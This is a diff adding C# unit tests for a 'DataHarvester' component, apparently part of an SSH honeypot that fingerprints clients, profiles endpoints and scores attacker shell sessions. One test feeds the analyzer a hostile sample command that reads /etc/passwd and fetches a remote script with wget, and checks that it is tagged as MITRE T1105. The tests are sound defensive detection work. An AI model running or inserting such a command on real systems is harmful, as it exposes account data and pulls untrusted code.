@@ -147,4 +147,42 @@ public class DataHarvesterTests
         Assert.Equal("dynamic_forward", analysis.TunnelingIntent);
         Assert.True(analysis.AssetValuePerceptionScore > 0);
     }
+
+    [Fact]
+    public void CalculateFingerprintHash_IsDeterministicAndNormalizesInput()
+    {
+        var first = DataHarvester.CalculateFingerprintHash("SSH-2.0-Client", "RSA-SHA2-512", "AA:BB");
+        var second = DataHarvester.CalculateFingerprintHash("ssh-2.0-client", "rsa-sha2-512", "aa:bb");
+
+        Assert.Equal(first, second);
+        Assert.Equal(64, first.Length);
+    }
+
+    [Theory]
+    [InlineData("127.0.0.1:22", "private", "private")]
+    [InlineData("10.10.1.2:22", "private", "private")]
+    [InlineData("8.8.8.8:22", "unknown", "lookup_unavailable")]
+    public void CategorizeInfrastructure_ProfilesEndpoint(string endpoint, string category, string asn)
+    {
+        var profile = DataHarvester.CategorizeInfrastructure(endpoint);
+
+        Assert.Equal(category, profile.Category);
+        Assert.Equal(asn, profile.Asn);
+    }
+
+    [Fact]
+    public void ShellSessionAnalytics_TracksFailureRatioAndSemanticDrift()
+    {
+        var analytics = new ShellSessionAnalytics { SessionStartedAt = DateTime.UtcNow.AddSeconds(-10) };
+
+        analytics.RecordCommand(DataHarvester.AnalyzeCommand("ls"));
+        analytics.RecordResult(false);
+        analytics.RecordCommand(DataHarvester.AnalyzeCommand("cat /etc/passwd | grep root && wget http://example.com/a.sh"));
+        analytics.RecordResult(true);
+
+        Assert.Equal(0.5, analytics.StandardErrorRatio);
+        Assert.True(analytics.SemanticDrift > 0);
+        Assert.Contains("T1105", analytics.MitreTechniqueCounts.Keys);
+        Assert.True(analytics.CalculateTuringMultiplier() > 0);
+    }
 }
